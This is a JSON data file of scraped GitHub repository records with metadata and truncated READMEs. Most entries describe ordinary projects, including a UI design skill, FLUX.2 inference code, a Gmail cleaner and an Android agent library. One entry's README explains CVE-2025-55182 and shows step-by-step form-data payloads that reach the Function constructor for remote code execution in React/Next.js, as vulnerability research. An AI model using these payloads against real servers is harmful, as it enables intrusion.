      "ssh_url": "git@github.com:nextlevelbuilder/ui-ux-pro-max-skill.git",
      "homepage": "https://ui-ux-pro-max-skill.nextlevelbuilder.io",
      "created_at": "2025-11-30T11:36:31Z",
      "updated_at": "2025-12-21T01:37:23Z",
      "pushed_at": "2025-12-06T07:03:28Z"
    },
    "stats": {
      "stars": 1319,
      "forks": 327,
      "watchers": 1319,
      "open_issues": 2,
      "size": 1264
    },
    "tech_info": {
      "language": "Python",
      "languages": {
        "Python": 45652,
        "TypeScript": 11766,
        "JavaScript": 1629
      },
      "license": "MIT License",
      "topics": [
        "ai-skills",
        "antigravity",
        "claude",
        "claude-code",
        "command-line",
        "command-line-tool",
        "copilot",
        "cursor-ai",
        "dashboard-templates",
        "html5",
        "kiro",
        "kiro-dev",
        "landing-page",
        "mobile-ui",
        "react",
        "tailwindcss",
        "ui-design",
        "uikit",
        "windsurf-ai"
      ]
    },
    "content": {
      "readme": "# UI UX Pro Max\n\nAn AI skill that provides design intelligence for building professional UI/UX across multiple platforms and frameworks.\n\n<p align=\"center\">\n  <img src=\"screenshots/website.png\" alt=\"UI UX Pro Max\" width=\"800\">\n</p>\n\n## Overview\n\nUI UX Pro Max is a searchable database of UI styles, color palettes, font pairings, chart types, product recommendations, UX guidelines, and stack-specific best practices. It works as a skill/workflow for AI coding assistants (Claude Code, Cursor, Windsurf, etc.).\n\n## Features\n\n- **57 UI Styles** - Glassmorphism, Claymorphism, Minimalism, Brutalism, Neumorphism, Bento Grid, Dark Mode, and more\n- **95 Color Palettes** - Industry-specific palettes for SaaS, E-commerce, Healthcare, Fintech, Beauty, etc.\n- **56 Font Pairings** - Curated typography combinations with Google Fonts imports\n- **24 Chart Types** - Recommendations for dashboards and analytics\n- **8 Tech Stacks** - React, Next.js, Vue, Svelte, SwiftUI, React Native, Flutter, HTML+Tailwind\n- **98 UX Guidelines** - Best practices, anti-patterns, and accessibility rules\n\n## Installation\n\n### Using CLI (Recommended)\n\n```bash\n# Install CLI globally\nnpm install -g uipro-cli\n\n# Go to your project\ncd /path/to/your/project\n\n# Install for your AI assistant\nuipro init --ai claude      # Claude Code\nuipro init --ai cursor      # Cursor\nuipro init --ai windsurf    # Windsurf\nuipro init --ai antigravity # Antigravity (.agent + .shared)\nuipro init --ai copilot     # GitHub Copilot\nuipro init --ai kiro        # Kiro\nuipro init --ai all         # All assistants\n```\n\n### Other CLI Commands\n\n```bash\nuipro versions              # List available versions\nuipro update                # Update to latest version\nuipro init --version v1.0.0 # Install specific version\n```\n\n### Manual Installation\n\nCopy the appropriate folders to your project:\n\n| AI Assistant   | Folders to Copy                                                     |\n| -------------- | ------------------------------------------------------------------- |\n| Claude Code    | `.claude/skills/ui-ux-pro-max/`                                     |\n| Cursor         | `.cursor/commands/ui-ux-pro-max.md` + `.shared/ui-ux-pro-max/`      |\n| Windsurf       | `.windsurf/workflows/ui-ux-pro-max.md` + `.shared/ui-ux-pro-max/`   |\n| Antigravity    | `.agent/workflows/ui-ux-pro-max.md` + `.shared/ui-ux-pro-max/`      |\n| GitHub Copilot | `.github/prompts/ui-ux-pro-max.prompt.md` + `.shared/ui-ux-pro-max/`|\n| Kiro           | `.kiro/steering/ui-ux-pro-max.md` + `.shared/ui-ux-pro-max/`        |\n\n## Prerequisites\n\nPython 3.x is required for the search script.\n\n```bash\n# Check if Python is installed\npython3 --version\n\n# macOS\nbrew install python3\n\n# Ubuntu/Debian\nsudo apt update && sudo apt install python3\n\n# Windows\nwinget install Python.Python.3.12\n```\n\n## Usage\n\n### Claude Code\n\nThe skill activates automatically when you request UI/UX work. Just chat naturally:\n\n```\nBuild a landing page for my SaaS product\n```\n\n### Cursor / Windsurf / Antigravity\n\nUse the slash command to invoke the skill:\n\n```\n/ui-ux-pro-max Build a landing page for my SaaS product\n```\n\n### Kiro\n\nType `/` in chat to see available commands, then select `ui-ux-pro-max`:\n\n```\n/ui-ux-pro-max Build a landing page for my SaaS product\n```\n\n### GitHub Copilot\n\nIn VS Code with Copilot, type `/` in chat to see available prompts, then select `ui-ux-pro-max`:\n\n```\n/ui-ux-pro-max Build a landing page for my SaaS product\n```\n\n### Example Prompts\n\n```\nBuild a landing page for my SaaS product\n\nCreate a dashboard for healthcare analytics\n\nDesign a portfolio website with dark mode\n\nMake a mobile app UI for e-commerce\n```\n\n### How It Works\n\n1. **You ask** - Request any UI/UX task (build, design, create, implement, review, fix, improve)\n2. **Skill activates** - The AI automatically searches the design database for relevant styles, colors, typography, and guidelines\n3. **Smart recommendations** - Based on your product type and requirements, it finds the best matching design system\n4. **Code generation** - Implements the UI with proper colors, fonts, spacing, and best practices\n\n### Supported Stacks\n\nThe skill provides stack-specific guidelines for:\n\n- **HTML + Tailwind** (default)\n- **React** / **Next.js**\n- **Vue** / **Svelte**\n- **SwiftUI** / **React Native** / **Flutter**\n\nJust mention your preferred stack in the prompt, or let it default to HTML + Tailwind.\n\n## Star History\n\n[![Star History Chart](https://api.star-history.com/svg?repos=nextlevelbuilder/ui-ux-pro-max-skill&type=Date)](https://star-history.com/#nextlevelbuilder/ui-ux-pro-max-skill&Date)\n\n## License\n\nThis project is licensed under the [MIT License](LICENSE).\n",
      "default_branch": "main"
    },
    "fetched_at": "2025-12-21T02:54:41.173221"
  },
  {
    "basic_info": {
      "name": "CVE-2025-55182",
      "full_name": "msanft/CVE-2025-55182",
      "owner": "msanft",
      "description": "Explanation and full RCE PoC for CVE-2025-55182",
      "url": "https://github.com/msanft/CVE-2025-55182",
      "clone_url": "https://github.com/msanft/CVE-2025-55182.git",
      "ssh_url": "git@github.com:msanft/CVE-2025-55182.git",
      "homepage": "",
      "created_at": "2025-12-04T11:49:55Z",
      "updated_at": "2025-12-21T00:01:40Z",
      "pushed_at": "2025-12-08T13:51:04Z"
    },
    "stats": {
      "stars": 1270,
      "forks": 183,
      "watchers": 1270,
      "open_issues": 0,
      "size": 70
    },
    "tech_info": {
      "language": "Python",
      "languages": {
        "Python": 1075,
        "TypeScript": 899,
        "JavaScript": 559,
        "CSS": 488
      },
      "license": null,
      "topics": []
    },
    "content": {
      "readme": "# CVE-2025-55182\n\nThis vulnerability allows RCE in React Server Functions, e.g. as\noffered by Next.js through insecure prototype references.\n\nI'm not an expert in React or Next.js, so take all the information\nhere with a grain of salt.\n\n## Background\n\nReact offers Server Functions[^1], which can be seen as sort of an RPC-\nover-HTTP. They can be used to fetch data from adjacent peers to ensure\nlow latency, or perform authenticated requests that the client lacks\ncredentials for.\n\nReact uses something called the React Flight Protocol[^2] for serialization\nof values passed to Server Functions.\n\nThe client passes \"chunks\" to the server, e.g. via form data:\n\n```py\nfiles = {\n    \"0\": (None, '[\"$1\"]'),\n    \"1\": (None, '{\"object\":\"fruit\",\"name\":\"$2:fruitName\"}'),\n    \"2\": (None, '{\"fruitName\":\"cherry\"}'),\n}\n```\n\nAs shown, these can have references in between each other.\nThe above payload deserializes to the following on the server:\n\n```js\n{ object: 'fruit', name: 'cherry' }\n```\n\nThe format itself is a little more intricate and allows for more\ncomplex serialization and deserialization, but this provides a\nbasic understanding for the actual vulnerability.\n\n## Vulnerability\n\nUntil this commit[^3], when traversing chunks in reference resolving,\nsuch as getting the `fruitName` from chunk 2 in the above example, React\ndidn't verify whether the requested key was actually set on the object.\nThis allowed us to get the object prototype[^4].\n\nThis can be demonstrated with a payload like this:\n\n```py\nfiles = {\n    \"0\": (None, '[\"$1:__proto__:constructor:constructor\"]'),\n    \"1\": (None, '{\"x\":1}'),\n}\n```\n\nWhich deserializes to the function constructor[^5]:\n\n```js\n[Function: Function]\n```\n\nWhen the chunk with ID 0 is not an array but an object, we can\nset the `then` key to the function constructor. The object is then\nreturned by the `decodeReplyFromBusboy` function and awaited by Next.js:\n\n```ts\n// action-handler.ts:888 (pre-patch)\nboundActionArguments = await decodeReplyFromBusboy(\n    busboy,\n    serverModuleMap,\n    { temporaryReferences }\n)\n```\n\nWhen this returns a thenable, the `await` in the caller will call it.\nThis is what happens with this payload:\n\n```py\nfiles = {\n    \"0\": (None, '{\"then\":\"$1:__proto__:constructor:constructor\"}'),\n    \"1\": (None, '{\"x\":1}'),\n}\n```\n\nLeading to this error:\n\n```console-out\nSyntaxError: Unexpected token 'function'\n    at Object.Function [as then] (<anonymous>) {\n      digest: '1259793845'\n    }\n```\n\nThe error looks like this since V8 calls an `await`ed function\nwith the internal `resolve` and `reject` functions, which, when\n`toString`ed, serialize to something like this:\n\n```js\nfunction () { [native code] }\n```\n\n## Exploitation\n\nSince we can trivially retrieve the `Function` constructor, the\nstraightforward way is to find a call gadget that invokes the\nconstructor with a user-controlled value (i.e., the code of the\nfunction as a string), and later calls the returned function.\n\nThere are multiple places that can call the function constructor,\nfor example `resolveServerReference`, where `id` is a controlled object,\nand `lastIndexOf` can be overwritten to return a user-controlled string\n(e.g. via `Array.prototype.join`) and `slice` can be overwritten to the\nfunction constructor. However, this place doesn't work as the second\ninvocation of `.slice()` supplies a number as the first argument,\nwhich -to my best knowledge- can never be handled by the function\nconstructor.\n\nHere, a brilliant idea from maple3142[^6] comes in. When `getChunk`\ngrabs the chunk at ID 0 as the root reference to start resolving the\nreference chain, *this very same chunk* can resolve to a crafted\n\"fake chunk\".\n\nWe can reference the crafted chunk 0 in chunk 1 by using the\n`$@` syntax, which returns the \"raw\" chunk, not it's resolved value:\n\n```js\ncase \"@\":\n  return (\n    (obj = parseInt(value.slice(2), 16)), getChunk(response, obj)\n  );\n```\n\nCombining this with our `then` overwrite from above, we can craft\nsomething like this:\n\n```py\nfiles = {\n    \"0\": (None, '{\"then\": \"$1:__proto__:then\"}'),\n    \"1\": (None, '\"$@0\"'),\n}\n```\n\nHere, chunk 0 overwrites its own `.then()` with the `.then()` of\nits own raw chunk representation. Put simply, we overwrite our\nown `.then()` with `Chunk.prototype.then`, which exists, since\n`Chunk`s are thenables:\n\n```js\nChunk.prototype.then = function (resolve, reject) {\n      switch (this.status) {\n        case \"resolved_model\":\n          initializeModelChunk(this);\n      }\n      // ...\n```\n\nWith the above payload, `Chunk.prototype.then` is eventually called\nwith the crafted chunk with ID 0.\n\nAs shown above, when `.status` on our fake chunk is `resolved_model`:\n\n```py\nfiles = {\n    \"0\": (None, '{\"then\": \"$1:__proto__:then\", \"status\": \"resolved_model\"}'),\n    \"1\": (None, '\"$@0\"'),\n}\n```\n\nWe get into `initializeModelChunk`. Here, `.value` is parsed as JSON,\nand then references are resolved on the returned object, using the \"outer\"\ncontext of our chunks with IDs 0 and 1:\n\n```js\nfunction initializeModelCh",
      "default_branch": "main"
    },
    "fetched_at": "2025-12-21T02:54:42.281376"
  },
  {
    "basic_info": {
      "name": "flux2",
      "full_name": "black-forest-labs/flux2",
      "owner": "black-forest-labs",
      "description": "Official inference repo for FLUX.2 models",
      "url": "https://github.com/black-forest-labs/flux2",
      "clone_url": "https://github.com/black-forest-labs/flux2.git",
      "ssh_url": "git@github.com:black-forest-labs/flux2.git",
      "homepage": null,
      "created_at": "2025-11-24T23:28:49Z",
      "updated_at": "2025-12-21T02:46:08Z",
      "pushed_at": "2025-12-01T13:32:55Z"
    },
    "stats": {
      "stars": 1244,
      "forks": 62,
      "watchers": 1244,
      "open_issues": 6,
      "size": 37542
    },
    "tech_info": {
      "language": "Python",
      "languages": {
        "Python": 84177
      },
      "license": "Apache License 2.0",
      "topics": []
    },
    "content": {
      "readme": "# FLUX.2\nby Black Forest Labs: https://bfl.ai.\n\nDocumentation for our API can be found here: [docs.bfl.ai](https://docs.bfl.ai/).\n\nThis repo contains minimal inference code to run image generation & editing with our FLUX.2 open-weight models.\n\n## `FLUX.2 [dev]`\n\n`FLUX.2 [dev]` is a 32B parameter flow matching transformer model capable of generating and editing (multiple) images. The model is released under the [FLUX.2-dev Non-Commercial License](model_licenses/LICENSE-FLUX-DEV) and can be found [here](https://huggingface.co/black-forest-labs/FLUX.2-dev).\n\nNote that the below script for `FLUX.2 [dev]` needs considerable amount of VRAM (H100-equivalent GPU). We partnered with Hugging Face to make quantized versions that run on consumer hardware; below you can find instructions on how to run it on a RTX 4090 with a remote text encoder, for other quantization sizes and combinations, check the [diffusers quantization guide here](docs/flux2_dev_hf.md).\n\n### Text-to-image examples\n\n![t2i-grid](assets/teaser_generation.png)\n\n### Editing examples\n\n![edit-grid](assets/teaser_editing.png)\n\n### Prompt upsampling\n\n`FLUX.2 [dev]` benefits significantly from prompt upsampling. The inference script below offers the option to use both local prompt upsampling with the same model we use for text encoding ([`Mistral-Small-3.2-24B-Instruct-2506`](https://huggingface.co/mistralai/Mistral-Small-3.2-24B-Instruct-2506)), or alternatively, use any model on [OpenRouter](https://openrouter.ai/) via an API call.\n\nSee the [upsampling guide](docs/flux2_with_prompt_upsampling.md) for additional details and guidance on when to use upsampling.\n\n## `FLUX.2` autoencoder\n\nThe FLUX.2 autoencoder has considerably improved over the [FLUX.1 autoencoder](https://huggingface.co/black-forest-labs/FLUX.1-dev/blob/main/ae.safetensors). The autoencoder is released under [Apache 2.0](https://huggingface.co/datasets/choosealicense/licenses/blob/main/markdown/apache-2.0.md) and can be found [here](https://huggingface.co/black-forest-labs/FLUX.2-dev/blob/main/ae.safetensors). For more information, see our [technical blogpost](https://bfl.ai/research/representation-comparison).\n\n## Local installation\n\nThe inference code was tested on GB200 and H100 (with CPU offloading).\n\n### GB200\n\nOn GB200, we tested `FLUX.2 [dev]` using CUDA 12.9 and Python 3.12.\n\n```bash\npython3.12 -m venv .venv\nsource .venv/bin/activate\npip install -e . --extra-index-url https://download.pytorch.org/whl/cu129 --no-cache-dir\n```\n\n### H100\n\nOn H100, we tested `FLUX.2 [dev]` using CUDA 12.6 and Python 3.10.\n\n```bash\npython3.10 -m venv .venv\nsource .venv/bin/activate\npip install -e . --extra-index-url https://download.pytorch.org/whl/cu126 --no-cache-dir\n```\n\n## Run the CLI\n\nBefore running the CLI, you may download the weights from [here](https://huggingface.co/black-forest-labs/FLUX.2-dev) and set the following environment variables.\n\n```bash\nexport FLUX2_MODEL_PATH=\"<flux2_path>\"\nexport AE_MODEL_PATH=\"<ae_path>\"\n```\n\nIf you don't set the environment variables, the weights will be downloaded\nautomatically.\n\nYou can start an interactive session with loaded weights by running the\nfollowing command. That will allow you to do both text to image generation as\nwell as editing one or multiple images.\n```bash\nexport PYTHONPATH=src\npython scripts/cli.py\n```\n\nOn H100, we additionally set the flag `--cpu_offloading True`.\n\n## Watermarking\n\nWe've added an option to embed invisible watermarks directly into the generated images\nvia the [invisible watermark library](https://github.com/ShieldMnt/invisible-watermark).\n\nAdditionally, we are recommending implementing a solution to mark the metadata of your outputs, such as [C2PA](https://c2pa.org/)\n\n## ğŸ§¨ Lower VRAM diffusers example\n\nThe below example should run on a RTX 4090. For more examples check the [diffusers quantization guide here](docs/flux2_dev_hf.md)\n\n```python\nimport torch\nfrom diffusers import Flux2Pipeline\nfrom diffusers.utils import load_image\nfrom huggingface_hub import get_token\nimport requests\nimport io\n\nrepo_id = \"diffusers/FLUX.2-dev-bnb-4bit\"\ndevice = \"cuda:0\"\ntorch_dtype = torch.bfloat16\n\ndef remote_text_encoder(prompts):\n    response = requests.post(\n        \"https://remote-text-encoder-flux-2.huggingface.co/predict\",\n        json={\"prompt\": prompts},\n        headers={\n            \"Authorization\": f\"Bearer {get_token()}\",\n            \"Content-Type\": \"application/json\"\n        }\n    )\n    prompt_embeds = torch.load(io.BytesIO(response.content))\n\n    return prompt_embeds.to(device)\n\npipe = Flux2Pipeline.from_pretrained(\n    repo_id, text_encoder=None, torch_dtype=torch_dtype\n).to(device)\n\nprompt = \"Realistic macro photograph of a hermit crab using a soda can as its shell, partially emerging from the can, captured with sharp detail and natural colors, on a sunlit beach with soft shadows and a shallow depth of field, with blurred ocean waves in the background. The can has the text `BFL Diffusers` on it and it has a color gradient that star",
      "default_branch": "main"
    },
    "fetched_at": "2025-12-21T02:54:43.395425"
  },
  {
    "basic_info": {
      "name": "gmail-cleaner",
      "full_name": "Gururagavendra/gmail-cleaner",
      "owner": "Gururagavendra",
      "description": "web based GUI to cleanup gmail delete, mark as read, unsubsribe from uncessary things u dont like",
      "url": "https://github.com/Gururagavendra/gmail-cleaner",
      "clone_url": "https://github.com/Gururagavendra/gmail-cleaner.git",
      "ssh_url": "git@github.com:Gururagavendra/gmail-cleaner.git",
      "homepage": "https://gururagavendra.github.io/gmail-cleaner/",
      "created_at": "2025-11-29T09:19:54Z",
      "updated_at": "2025-12-21T00:56:07Z",
      "pushed_at": "2025-12-21T01:44:08Z"
    },
    "stats": {
      "stars": 1231,
      "forks": 63,
      "watchers": 1231,
      "open_issues": 12,
      "size": 20104
    },
    "tech_info": {
      "language": "Python",
      "languages": {
        "Python": 122011,
        "JavaScript": 77906,
        "HTML": 64105,
        "CSS": 36089,
        "Dockerfile": 720,
        "Procfile": 20
      },
      "license": "MIT License",
      "topics": [
        "open-source",
        "self-hosted"
      ]
    },
    "content": {
      "readme": "# Gmail Bulk Unsubscribe & Cleanup Tool\n\nA **free**, privacy-focused tool to bulk unsubscribe from emails, delete emails by sender, and mark emails as read. No subscriptions, no data collection - runs 100% on your machine.\n\n\n![Python](https://img.shields.io/badge/Python-3.9+-blue?style=flat-square&logo=python)\n![Docker](https://img.shields.io/badge/Docker-Ready-2496ED?style=flat-square&logo=docker)\n![Gmail API](https://img.shields.io/badge/Gmail-API-EA4335?style=flat-square&logo=gmail)\n![License](https://img.shields.io/badge/License-MIT-green?style=flat-square)\n![GitHub stars](https://img.shields.io/github/stars/Gururagavendra/gmail-cleaner?style=flat-square&logo=github)\n\n> **No Subscription Required - Free Forever**\n\n## Features\n\n| Feature | Description |\n|---------|-------------|\n| **Bulk Unsubscribe** | Find newsletters and unsubscribe with one click |\n| **Delete by Sender** | See who sends you the most emails, delete in bulk |\n| **Mark as Read** | Bulk mark thousands of unread emails as read |\n| **Smart Filters** | Filter by days, size of email, and category (Promotions, Social, Updates) |\n| **Privacy First** | Runs locally - your data never leaves your machine |\n| **Super Fast** | Gmail API with batch requests (100 emails per API call) |\n| **Gmail-style UI** | Clean, familiar interface |\n\n## Platform Support\n\nWorks on **all major platforms** - both Docker and local installation:\n\n| Platform | Docker | Local (Python) |\n|----------|--------|----------------|\n| Linux (x86_64) | Native | Native |\n| Windows (x86_64) | Native | Native |\n| macOS Intel | Native | Native |\n| macOS Apple Silicon (M1/M2/M3/M4) | Native | Native |\n\n## Demo\n\n![Gmail Cleaner Demo](demo.gif)\n\n**[Watch Setup Video on YouTube](https://youtu.be/CmOWn8Tm5ZE)** - Step-by-step video on how to setup the repo and run the project locally.\n\n## Feature Requests\n\nLets make this tool a better one by improving as much as possible, All features are welcome, To request a feature, [open a GitHub issue](https://github.com/Gururagavendra/gmail-cleaner/issues/new).\n\n## Prerequisites\n\n- **Docker**: [Docker Desktop](https://www.docker.com/products/docker-desktop/)\n- **Local (Python)**: [Python 3.9+](https://www.python.org/downloads/) and [uv](https://docs.astral.sh/uv/getting-started/installation/)\n\n## Setup\n\n**Important**: You must create your **OWN** Google Cloud credentials. This app doesn't include pre-configured OAuth - that's what makes it privacy-focused! Each user runs their own instance with their own credentials.\n\n### 1. Get Google OAuth Credentials\n\n**Video Tutorial**: [Watch on YouTube](https://youtu.be/CmOWn8Tm5ZE) for a visual walkthrough\n\n1. Go to [Google Cloud Console](https://console.cloud.google.com/)\n2. Create a new project (or select existing)\n3. Search for **\"Gmail API\"** and **Enable** it\n4. Go to **Google Auth Platform**  â†’ Click **\"Get started\"**\n5. Fill in the wizard:\n   - **App Information**: Enter app name (e.g., \"Gmail Cleanup\"), select your email\n   - **Audience**: Select **External**\n   - **Contact Information**: Add your email address\n   - Click **Create**\n6. Go to **Audience** (left sidebar) â†’ Scroll to **Test users**\n   - Click **Add Users** â†’ Add your Gmail address â†’ **Save**\n7. Go to **Clients** (left sidebar) â†’ **Create Client**\n   - Choose the application type based on your setup:\n\n   | Setup | Application Type | Redirect URI |\n   |-------|------------------|--------------|\n   | **Local/Desktop** (Python with browser) | Desktop app | Not needed |\n   | **Docker/Remote Server** | Web application | `http://YOUR_HOST:8767/` |\n\n   - Name: \"Gmail Cleanup\" (or anything)\n   - Click **Create**\n   - Click **Download** (downloads JSON file)\n   - Rename the downloaded file to `credentials.json`\n\n> **ğŸ’¡ Which should I choose?**\n> - Running locally with Python (`uv run python main.py`)? â†’ **Desktop app**\n> - Running with Docker or on a remote server? â†’ **Web application**\n\n### 2. Clone the Repository\n\n1. Clone the repo:\n```bash\ngit clone https://github.com/Gururagavendra/gmail-cleaner.git\n```\n\n2. Navigate to the folder:\n```bash\ncd gmail-cleaner\n```\n\n3. Put your `credentials.json` file in the project folder.\n\n## Usage\n\n### Option A: Docker (Recommended)\n\n1. Pull the latest image and start the container:\n```bash\ndocker compose pull && docker compose up\n```\n\n2. Open the app in your browser:\n```\nhttp://localhost:8766\n```\n\n3. Click **\"Sign In\"** button in the web UI\n\n4. Check logs for the OAuth URL (only after clicking Sign In!):\n```bash\ndocker logs $(docker ps -q --filter ancestor=ghcr.io/gururagavendra/gmail-cleaner)\n```\nOr if you built locally:\n```bash\ndocker logs $(docker ps -q --filter name=gmail-cleaner)\n```\n\n5. Copy the Google OAuth URL from logs, open in browser, and authorize:\n   - Choose your Google account\n   - \"Google hasn't verified this app\" â†’ Click **Continue**\n     > This warning appears because you created your own OAuth app (not published to Google). This is expected and safe - you control the app!\n   - Grant permissions",
      "default_branch": "main"
    },
    "fetched_at": "2025-12-21T02:54:44.630244"
  },
  {
    "basic_info": {
      "name": "android-action-kernel",
      "full_name": "Action-State-Labs/android-action-kernel",
      "owner": "Action-State-Labs",
      "description": null,
      "url": "https://github.com/Action-State-Labs/android-action-kernel",
      "clone_url": "https://github.com/Action-State-Labs/android-action-kernel.git",
      "ssh_url": "git@github.com:Action-State-Labs/android-action-kernel.git",
      "homepage": null,
      "created_at": "2025-12-11T11:07:23Z",
      "updated_at": "2025-12-21T00:12:41Z",
      "pushed_at": "2025-12-17T14:00:57Z"
    },
    "stats": {
      "stars": 1183,
      "forks": 153,
      "watchers": 1183,
      "open_issues": 7,
      "size": 32
    },
    "tech_info": {
      "language": "Python",
      "languages": {
        "Python": 6679
      },
      "license": "MIT License",
      "topics": []
    },
    "content": {
      "readme": "# Android Use\n\n<div align=\"center\">\n\n<h1>AI Agents for Android Devices</h1>\n\n<h3>Open-source library for AI agents to control native Android apps</h3>\n\n**Built for field workers, logistics, gig economy, and mobile-first industries**\n\n<br>\n\n[![Twitter](https://img.shields.io/badge/5.3M+-views-1DA1F2?style=for-the-badge&logo=x&logoColor=white)](https://x.com/ethanjlim/status/1999152070428148108?s=20)\n[![Stars](https://img.shields.io/github/stars/actionstatelabs/android-action-kernel?style=for-the-badge)](https://github.com/actionstatelabs/android-action-kernel/stargazers)\n[![License](https://img.shields.io/badge/license-MIT-green?style=for-the-badge)](LICENSE)\n[![Python](https://img.shields.io/badge/python-3.10+-blue?style=for-the-badge&logo=python&logoColor=white)](https://www.python.org/)\n\n<br>\n\n### Demo\n\n**[Watch it automate a logistics workflow in 60 seconds](https://x.com/ethanjlim/status/1999152070428148108?s=20)**\n\n<sub>Driver texts a photo â†’ Agent handles WhatsApp â†’ Scanner app â†’ Banking app â†’ Invoice submitted</sub>\n\n<br>\n\n**[â­ Star this repo (1100+ â†’ 1,500 goal!)](https://github.com/actionstatelabs/android-action-kernel) â€¢ [Quick Start](#quick-start) â€¢ [Book Partnership Meeting](https://build.fillout.com/editor/ctqhgaBkaKus/share)**\n\n**5.3M+ views. 1100+ stars in days. Help us reach 1,500!** â€¢ **Priority partnerships:** Trucking/logistics â€¢ Mobile QA testing â€¢ [Request meeting â†’](https://build.fillout.com/editor/ctqhgaBkaKus/share)\n\n</div>\n\n---\n\n## The Problem\n\nBrowser agents only work on websites. Computer Use requires a desktop.\n\nBut the real economy runs on mobile devices, in places where laptops don't fit:\n\n- **Truck drivers** submit invoices from the cab using factoring apps (RTS Pro, OTR Capital)\n- **Delivery drivers** scan packages on handheld devicesâ€”200+ per route\n- **Gig workers** accept orders on phones between ridesâ€”losing 20% earnings to slow manual switching\n- **Field technicians** log work orders on tablets at job sites\n- **Mobile banking** happens on native apps with 2FA, not web browsers\n\n**3 billion Android devices. $40 trillion in GDP from mobile-first workflows. Zero AI agent solutions that actually work on these devices.**\n\n---\n\n## Real Example: Logistics Automation\n\n**Priority partnership area.** Android Use automating an entire logistics workflow:\n\n### Before (Manual - 10+ minutes)\n```\n1. Driver takes photo of Bill of Lading\n2. Opens WhatsApp, sends to back office\n3. Back office downloads image\n4. Opens banking app, fills invoice form\n5. Uploads documents\n6. Submits for payment\n```\n\n### After (Automated - 30 seconds)\n```python\n# Driver just texts the photo. Agent does the rest.\nrun_agent(\"\"\"\n1. Get latest image from WhatsApp\n2. Open native scanner app and process it\n3. Switch to RTS Pro factoring app\n4. Fill invoice form with extracted data\n5. Upload PDF and submit for payment\n\"\"\")\n```\n\n**Result:** Driver gets paid same day instead of waiting weeks. Back-office work eliminated. No laptop needed.\n\n---\n\n## Why This Works\n\n<table>\n<tr>\n<td width=\"50%\">\n\n### Computer Use (Anthropic)\n- Requires desktop/laptop\n- Takes screenshots â†’ OCR\n- Sends images to vision model\n- **$0.15 per action**\n- 3-5 second latency\n- Doesn't work on phones\n\n</td>\n<td width=\"50%\">\n\n### Android Use (This Library)\n- Works on handheld devices\n- Reads accessibility tree (XML)\n- Structured data â†’ LLM\n- **$0.01 per action (95% cheaper)**\n- <1 second latency\n- Native mobile app control\n\n</td>\n</tr>\n</table>\n\n**The breakthrough:** Android's accessibility API provides structured UI data (buttons, text, coordinates) without expensive vision models.\n\n**Real impact:** 95% cost savings + 5x faster + works where laptops can't.\n\n---\n\n## Traction\n\nLaunched with the logistics demo:\n\n- **5.3M+ views** on X/Twitter ([watch demo](https://x.com/ethanjlim/status/1999152070428148108?s=20))\n- **1100+ GitHub stars** (from 12 stars at launch - help us reach 1,500!)\n- **150+ inbound messages** from logistics companies, gig platforms, field service providers  \n- **5 active pilot programs** with trucking companies and delivery fleets\n- **3 factoring companies** exploring partnership integrations\n- Validated product-market fit within first 24 hours\n\n**Star growth shows real demand.** Help us reach 1,500 stars â†’ **[Star this repo now](https://github.com/actionstatelabs/android-action-kernel/stargazers)**\n\n**Current priority partnerships:**\n- **Trucking/logistics companies** - Factoring app automation, invoice processing, driver workflows\n- **QA testing teams** - Automated mobile app testing at scale\n\nDue to overwhelming demand, we created a meeting scheduler. **[Request a partnership meeting â†’](https://build.fillout.com/editor/ctqhgaBkaKus/share)**\n\n---\n\n## The Market: Mobile-First Industries\n\n| Industry | Why They Need This | Market Size | Current State |\n|----------|-------------------|-------------|---------------|\n| **Logistics** | Drivers use factoring apps (RTS Pro, OTR Capital) in truck cabs | **$10.5T** | Manual, no laptop acces",
      "default_branch": "main"
    },
    "fetched_at": "2025-12-21T02:54:45.743233"
  }
]